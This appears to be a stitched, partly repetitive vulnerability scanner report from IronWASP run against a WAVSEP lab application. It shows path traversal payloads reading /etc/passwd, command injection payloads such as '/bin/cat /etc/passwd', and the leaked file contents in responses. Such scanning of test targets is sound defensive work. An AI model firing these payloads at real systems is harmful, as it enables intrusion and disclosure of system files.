This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:

This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.

After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case24-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt

----- END OF INTERESTING TEXT -----

[---- Snipped parts of HTTP headers section for brevity ----]

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd\0

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case22-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case22-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

Command Injection Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/OS-Command-Injection/OS-Command-Injection-GET-200Error/Case3-OSCmdInjection-GenericOS-InitialCommandContext-SimpleStatement-DefaulInvalidInput-NoValidation.jsp?target=dfdflkjsh
Affected Parameter:target
Parameter Location:Query
Description:
Command Injection was identified in the target parameter of the Query section of the scanned request.

Command Injection is an issue where it is possible to inject and execute operating system commands on the server-side. For more details on this issue refer https://www.owasp.org/index.php/Command_Injection

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /bin/cat /etc/passwd as payload to the application. This payload has a small system command - /bin/cat /etc/passwd. If this command is executed by the server then the contents of the etc/passwd file will be present in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the injected command was executed by the server and the contents of the etc/passwd file was printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request contains a system command which if executed will add the numbers prints the contens of the etc/passwd file on the server. The system command is : /bin/cat /etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/OS-Command-Injection/OS-Command-Injection-GET-200Error/Case3-OSCmdInjection-GenericOS-InitialCommandContext-SimpleStatement-DefaulInvalidInput-NoValidation.jsp?target=+%2fbin%2fcat+%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=CD9AC75A9F5705C51304DA31B8394DFB



Response from the Server:

This response body contains the contents of the etc/passwd file

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent ping -c 6 localhost as payload to the application. This payload has a small system command - ping -c 6 localhost. If this command is executed then the server will ping itself 6 times. This will cause the response to be returned around 5000 milliseconds later than usual. After the payload was injected the response from the application took 5206 milliseconds. Normally this particular request is processed at around 1 milliseconds. This indicates that the injected command could have been executed on the server-side.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of ping requests sent to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request contains a system command which if executed will cause the response to be delayed by 5000 milliseconds. The system command is: ping -c 6 localhost

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/OS-Command-Injection/OS-Command-Injection-GET-200Error/Case3-OSCmdInjection-GenericOS-InitialCommandContext-SimpleStatement-DefaulInvalidInput-NoValidation.jsp?target=+ping+-c+6+localhost HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=CD9AC75A9F5705C51304DA31B8394DFB



Information about the Response from the Server:

It took 5206milliseconds to recieve the response from the server. It took so long because of the 5000 millisecond delay caused by the payload.

Session Fixation Found
<<<>>>
Type:Vulnerability
Severity:Medium
Confidence:Low
Found By:Passive Analysis

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-GET-Experimental/textvalue?password=pppp
Description:
The application does not set a new Session ID in the cookie after what appears to be an authentication attempt by the user. If this was a successful login and the Session IDs are stored in cookies then this application is affected by Session Fixation vulnerability.
In-domain JS Inclusion
<<<>>>
Type:Vulnerability
Severity:Medium
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-GET-Experimental/Case07-ScriptlessInjectionInScriptTagSrcAttribute.jsp?userinput=textvalue
Affected Parameter:userinput
Parameter Location:Query
Description:
In-domain JS Inclusion was identified in the userinput parameter of the Query section of the scanned request.
It is possible to set the location of JS source URL to a resource within the same domain. If user's are allowed to upload text files on to this domain then an attacker can upload script as a regular text file and execute it using this vulnerability.
The relevant parts of the requests/responses pairs associated with the check that discovered this issue are available below.
Request sent by Scanner:

The payload in this request is random string just to check where this value it is reflected back in the response.

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-GET-Experimental/Case07-ScriptlessInjectionInScriptTagSrcAttribute.jsp?userinput=aaaa162aaaaa HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue



Response from the Server:

The random string from the payload has been found in the src attribute of tags loading JS files.

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 472

[---- Snipped parts of HTTP body section for brevity ----]d>
<body>
<!--
Contributed by the IronWASP project (http://ironwasp.org/).
Original Author: Lavakumar Kuppan (lava@ironwasp.org).
-->

<script src="aaaa162aaaaa"/>


</body>
</html>

SQL Error Messages Found

Parameter Location:Headers
Description:
SQL Error Triggering was identified in the User-Agent parameter of the Headers section of the scanned request. SQL Error Messages have been found in the response when testing this parameter. All checks performed to identify SQL Injection returned negative results so the reason for why these error messages appear cannot be determined.

Cookie parameter missing the HttpOnly flag
<<<>>>
Type:Vulnerability
Severity:Medium
Confidence:High
Found By:Passive Analysis

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-FalsePositives-GET/Case05-CrlfRemovalInHttpHeader.jsp?userinput=abcd
Description:
The HttpOnly flag was missing on the cookie: parameter. This may allow an attacker to get the cookie information using XSS attacks.
Analyzed Response:

The value of the cookie is not protected by HttpOnly flag and hence becomes accessible from JavaScript

HTTP/1.1 200
Server-Info: abcd
Set-Cookie: parameter=abcd; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:10 GMT
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 14


AutoComplete Enabled on Password Fields
<<<>>>
Type:Vulnerability
Severity:Low
Confidence:High
Found By:Passive Analysis

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-GET-Experimental/Case05-ScriptlessInjectionInFormTagActionAttribute.jsp?userinput=textvalue
Description:
AutoComplete feature has not been disabled on the form/fields that accept Passwords from users
Information about the Analyzed Response:

This response contains INPUT elements whose type attribute is password but their autocomplete attribute is not set to 'off'

Cookie userinput may contain sensitive information
<<<>>>
Type:Test Lead
Found By:Passive Analysis

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-COOKIE-Experimental/index.jsp
Description:
The cookie: userinput might contain sensitive information which could be easily accessed or modified to exploit the web application.
Analyzed Response:

The cookie name or value indicates that it could hold important information

HTTP/1.1 200
Set-Cookie: userinput=EmptyValue; HTTPOnly
[---- Snipped parts of HTTP headers section for brevity ----]
Date: Thu, 09 May 2024 18:52:03 GMT


DOM XSS Sources found

<<<>>>
Type:Test Lead
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/DOM-XSS/DXSS-Detection-Evaluation-GET-Experimental/Case03-InjectionInToVariableBeingAssignedToDomXssSinkEval.jsp?userinput=textvalue

Parameter Location:Query
Description:
Reflection in to JavaScript was identified in the userinput parameter of the Query section of the scanned request. Data injected in to this parameter is being reflected back inside JavaScript. Manually check this for XSS.

Request sent by Scanner:

The payload in this request is random string just to check where this value it is reflected back in the response.

Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue



Response from the Server:

The injected payload is found inside the JavaScript code section of this response.

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 367

</head>

XSS Plugin found reflection in JavaScript
<<<>>>
Type:Test Lead
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Unvalidated-Redirect/Redirect-JavaScript-Detection-Evaluation-GET-200Valid/Case11-Redirect-RedirectMethod-FilenameContext-HttpInputValidation-HttpURL-DefaultEmptyInput-AnyPathReq-Read.jsp?target=

Parameter Location:Query
Description:
